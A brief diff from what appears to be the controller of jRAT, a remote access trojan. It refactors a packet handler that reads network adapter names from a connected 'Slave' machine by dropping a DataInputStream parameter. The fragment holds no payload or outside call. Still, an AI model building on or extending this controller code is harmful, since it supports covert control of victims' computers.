@@ -4,13 +4,11 @@ import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlAdapters;
 
-import java.io.DataInputStream;
-
 
 public class Packet56NetworkAdapter extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
+	public void read(Slave slave) throws Exception {
 		String displayname = slave.readLine();
 		String name = slave.readLine();
 
